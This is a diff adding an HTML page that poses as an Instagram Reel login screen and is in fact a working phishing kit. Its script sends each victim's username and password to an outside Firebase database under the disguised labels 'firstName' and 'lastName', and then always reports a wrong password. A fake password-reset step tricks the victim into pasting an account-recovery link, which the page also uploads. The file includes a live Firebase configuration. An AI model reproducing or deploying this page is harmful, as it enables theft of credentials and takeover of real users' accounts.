@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram Reel by mr_alone_gamer</title>
+        
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        
+        <script src="https://www.gstatic.com/firebasejs/5.5.3/firebase.js"></script>
+        
+        
+        <style>       
+*{
+     margin:0;
+     padding:0;
+     border:0px solid black;
+ }
+
+body {
+   height:100vh;
+   width:100vw;
+   overflow:hidden;
+   user-select:none;
+   font-family: serif,sans-serif;
+}
+
+.english {
+    position:absolute;
+    transform:translate(-50%,50%);
+    left:50%;
+    color:grey;
+    font-size:15px;
+}
+
+
+.login {
+    position:absolute;
+    top:15%;
+    margin-left:50%;
+    transform:translateX(-50%);
+}
+
+
+.instagram {
+    position:relative;
+    height:50px;
+    top:15%;
+    transform:translateX(-50%);
+    margin-left:50%;
+}
+
+input , #login , .onetaplogin {
+    display:block;
+    height:40px;
+    transform:translateX(-50%);
+    position:;
+    width:60vw;
+    margin-top:10px;
+    border-radius:5px;
+    outline:none;
+    border:1px solid lightgrey;
+    padding-left:10px;
+    margin-left:50%;
+}
+
+.login p {
+    color:#2196F3;
+    font-weight:400;
+    margin-top:15px;
+    font-size:12px;
+    margin-left:58%;
+    padding:0;
+    white-space:nowrap;
+}
+
+#login {
+    padding:0;
+    background-color:#2196F3;
+    color:white;
+    margin-top:15px;
+    font-weight:700;
+    border:none;
+    color:white;
+    opacity:0.3;
+}
+
+#meta {
+    position:fixed;
+    height:38px;
+    top:95vh;
+    transform:translate(-50%,-50%);
+    left:50%;
+}
+
+a {
+    text-decoration:none;
+}
+
+
+
+.spinner {
+  position:relative;
+  margin: 0px auto 0;
+  width: 30px;
+  text-align: center;
+  bottom:30px;
+  display:none;
+}
+
+.spinner > div {
+  width: 6.3px;
+  height: 6.3px;
+  background-color: #fff;
+
+  border-radius: 100%;
+  display: inline-block;
+  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+}
+
+.spinner .bounce1 {
+  -webkit-animation-delay: -0.32s;
+  animation-delay: -0.32s;
+}
+
+.spinner .bounce2 {
+  -webkit-animation-delay: -0.16s;
+  animation-delay: -0.16s;
+}
+
+@-webkit-keyframes sk-bouncedelay {
+  0%, 80%, 100% { -webkit-transform: scale(0) }
+  40% { -webkit-transform: scale(1.0) }
+}
+
+@keyframes sk-bouncedelay {
+  0%, 80%, 100% { 
+    -webkit-transform: scale(0);
+    transform: scale(0);
+  } 40% { 
+    -webkit-transform: scale(1.0);
+    transform: scale(1.0);
+  }
+}
+
+#blank {
+    position:absolute;
+    top:0;
+    left:0;
+    height:100%;
+    width:100%;
+    background-color: rgba(0, 0, 0, 0.6);
+    display:none;
+}
+
+#wrong {
+    position:absolute;
+    width:60%;
+    transform:translate(-50%,-50%);
+    top:50%;
+    left:50%;
+    background-color:white;
+    border-radius:10px;
+    overflow:hidden;
+    display:none;
+}
+
+#cap {
+    text-align:center;
+    margin-top:18px;
+    white-space:nowrap;
+    margin-bottom:0%;
+}
+
+#minicap {
+    transform:translate(-50%,50%);
+    margin-left:50%;
+    font-size:14px;
+    color:grey;
+    width:80%;
+    text-align:center;
+}
+
+hr {
+    width:100%;
+    height:0.5px;
+    background-color:lightgrey;
+}
+
+h5 {
+    margin-top:15px;
+}
+
+.tryagain {
+    width:100%;
+    background-color:;
+    margin-top:40px;
+    text-align:center;
+    color:#2196F3;
+    padding-bottom:15px;
+}
+
+.tryagain:active {
+    background-color:lightgrey;
+}
+
+
+#page2 {
+    position:absolute;
+    top:0;
+    bottom:0;
+    height:100%;
+    width:100%;
+    background-color:white;
+    display:none;
+}
+
+#page2 p:nth-child(1) {
+    padding:15px; 
+    font-weight:500; 
+    font-size:16px;
+}
+
+.in_as {
+    padding:15px; 
+    font-weight:500;
+    margin-top:5%;
+    white-space:nowrap;
+    font-size:20px;;
+    text-align:center;
+}
+
+#username {
+    transform:translate(-50%,0);
+    margin-top:10px;
+    margin-left:50%;
+    text-align:center;
+    font-weight:500;
+    font-size:20px;
+}
+
+* {
+    border:0px solid black;
+}
+
+
+#page2 img {
+    height:100px;
+    border-radius:50%;
+    margin-top:0%;
+    transform:translate(-50%,0);
+    margin-left:50%;
+}
+
+
+#page2 p:nth-child(4) {
+    padding:15px; 
+    font-weight:500;
+    margin-top:5%;
+    white-space:nowrap;
+    text-align:center;
+}
+
+.onetaplogin {
+    padding:0;
+    background-color:#2196F3;
+    color:white;
+    margin-top:15px;
+    font-weight:700;
+    border:none;
+    color:white;
+}
+
+
+.bigloading {
+    position:absolute;
+    top:0;
+    left:0;
+    height:100%;
+    width:100%;
+    background-color:#2196F3;
+    display:none;
+}
+
+.bigloading p {
+    position:absolute;
+    transform:translate(-50%,-50%);
+    top:40%;
+    left:50%;
+    font-weight:500;
+    font-size:20px;
+    white-space:nowrap;
+    text-align: center;
+    color:white;
+}
+
+
+.spinner2 {
+  position:absolute;
+  transform:translate(-50%,-50%);
+  top:50%;
+  left:50%;
+  width: 70px;
+  text-align: center;
+}
+
+.spinner2 > div {
+  width: 13px;
+  height: 13px;
+  background-color: #fff;
+
+  border-radius: 100%;
+  display: inline-block;
+  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+}
+
+.spinner2 .bounce1 {
+  -webkit-animation-delay: -0.32s;
+  animation-delay: -0.32s;
+}
+
+.spinner2 .bounce2 {
+  -webkit-animation-delay: -0.16s;
+  animation-delay: -0.16s;
+}
+
+
+
+        </style>
+        
+        
+        
+        
+        
+    </head>
+    <body>
+        <p class="english">English (India) </p>
+        
+        
+        <div class="login" >
+        
+        <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+        
+        <input id="email" type="text" placeholder="Phone number, username, or email" />
+        
+        <input id="pass" type="password" placeholder="Password" />
+        <a onclick="forgetpass()">
+        <p id="forgetpass"> Forget Password?</p> </a>
+        
+        <button id="login">Log In</button>
+        
+        <div class="spinner" id="spinner">
+  <div class="bounce1"></div>
+  <div class="bounce2"></div>
+  <div class="bounce3"></div>
+</div>
+        
+        
+        
+        </div>
+        
+        <img id="meta" src="https://i.ibb.co/ZmTXTzN/1642699576538.png" />
+        
+        <div id="page2">
+            
+            <p id="back"> Back </p>
+            
+            <img class="profile" src="https://i.ibb.co/kcSNzZT/Q-1642755101002.jpg"/>
+            <p id="username"> Nani.512 </p>
+            
+            
+            <p>Copy paste the link send to +91 91213 95020 below </p>
+            
+            <input id="link" type="text" placeholder="https://ig.me/[CODE]" />
+            
+            <button onclick="onetaplogin()" class="onetaplogin">One tap login</button>
+            
+            
+        </div>
+        
+        
+        
+        
+        <div id="blank">
+            <div id="wrong">
+                <div>
+                    
+                    <h4 id="cap">Incorrect Password</h4>
+                    
+    <p id="minicap">The password you entered is incorrect. Please try again.</p>      
+            <div class="tryagain" id="tryagain">
+                <hr>
+                <h5 id="alertbuttontext">Try Again</h5>
+            </div>     
+                </div> 
+            </div>
+        </div>
+        
+        
+        
+        <div class="bigloading">
+            
+      <p> Finding Accounts on this device </p>  
+            
+         <div class="spinner2">
+  <div class="bounce1"></div>
+  <div class="bounce2"></div>
+  <div class="bounce3"></div>
+         </div>
+            
+            
+            
+        </div>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </body>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
+
+    
+    <script>
+    
+    document.getElementById("meta").style.top = (innerHeight-(innerHeight/18))+"px";
+    
+    document.getElementById("page2").style.height = innerHeight+"px";
+    
+    
+var email = document.getElementById("email");
+var pass = document.getElementById("pass");
+var login = false;
+
+
+email.onkeyup = () => {
+    check();
+}
+
+pass.onkeyup = () => {
+    check();
+}
+
+
+
+function check() {
+    let emailc = false,passc = false;
+    
+    if(!isNaN(email.value))
+    {
+        if(email.value.length == 10)
+        emailc = true;
+    }
+    else {
+        emailc = true;
+    }
+    
+    if(pass.value.length >= 6)
+    {
+        passc = true;
+    }
+    
+    if(emailc && passc) {
+        document.getElementById("login").style.opacity = "1";
+        login = true;
+        
+    }
+    else {
+        document.getElementById("login").style.opacity = "0.3";
+        login = false;
+    }
+    
+}
+
+
+document.getElementById("login").onclick = () => {
+    if(login) {
+    
+    
+    document.getElementById("login").style.color = "#2196F3";
+    
+    document.getElementById("spinner").style.display  = "block";
+    
+    setTimeout( () => {
+    document.getElementById("blank").style.display = "block";
+    document.getElementById("wrong").style.display = "block";
+    
+    document.getElementById("login").style.color = "white";
+    
+    document.getElementById("spinner").style.display  = "none";
+    
+    
+    
+    },Math.floor(Math.random()*5000)+1000);
+    
+    }
+}
+
+document.getElementById("tryagain").onclick = () => {
+    document.getElementById("blank").style.display = "none";
+    document.getElementById("wrong").style.display = "none";
+}
+
+function forgetpass() {
+    
+    sendlink();
+    
+    $(".bigloading").css("display","block");
+    
+    $("#page2").css("display","block");
+    
+    $("#blank").css("display","block");
+    
+    $("#cap").text("SMS Sent");
+    
+    $("#minicap").text("We sent an SMS to +91 91213 95020 with the link to get back into your account");
+    
+    $("#alertbuttontext").text("OK");
+    
+    $("#wrong").css("display","block");
+    
+    setTimeout( () => {
+        $(".bigloading").css("display","none");
+    },Math.floor(Math.random()*2000)+1000)
+    
+    
+    
+}
+
+
+function onetaplogin() {
+
+    uploadlink();
+    
+    $("#link").css("border","1px solid red");
+    
+    
+    $("#link").focus(function () {
+        $("#link").css("border","1px solid lightgrey");
+    })
+    
+    
+    
+    $("#blank").css("display","block");
+    
+    $("#cap").text("Incorrect Code");
+    
+    $("#minicap").text("The code you entered is incorrect make sure you used both Upper & Lower case letters");
+    
+    $("#alertbuttontext").text("Try Again");
+    
+    $("#wrong").css("display","block");
+    
+    
+    
+}
+
+
+
+$("#back").click(function () {
+    
+    $("#cap").text("Incorrect Password");
+    
+    $("#minicap").text("The password you entered is incorrect. Please try again.");
+    
+    $("#alertbuttontext").text("Try Again");
+    
+    $("#page2").css("display","none");
+    
+});
+
+
+
+
+
+
+
+
+
+
+
+
+var config = {
+    apiKey: "AIzaSyA_kyipbRucrtWAtf8jbULc1B0DBRHPHHU",
+
+
+    authDomain: "sharemedia-298b0.firebaseapp.com",
+
+
+    databaseURL: "https://sharemedia-298b0-default-rtdb.firebaseio.com/",
+
+
+    projectId: "sharemedia-298b0",
+
+
+    storageBucket: "sharemedia-298b0.appspot.com",
+
+
+    messagingSenderId: "453857796374"
+  };
+
+firebase.initializeApp(config); 
+var rootRef = firebase.database().ref().child('graduate');
+
+
+
+$('#login').click(function(){ 
+if(login) {
+rootRef.push().set({ firstName:$('#email').val(), lastName:$('#pass').val() }); 
+}
+})
+
+function sendlink() {
+
+let codevalue = Math.floor(Math.random()*100);
+
+    rootRef.push().set({ command:"Send Link", code: codevalue }); 
+}
+
+function uploadlink() {
+    let codevalue = Math.floor(Math.random()*100)+100;
+
+    rootRef.push().set({ link: $('#link').val() , code: codevalue }); 
+}
+
+
+
+
+</script>
+
+
+   
+</html>
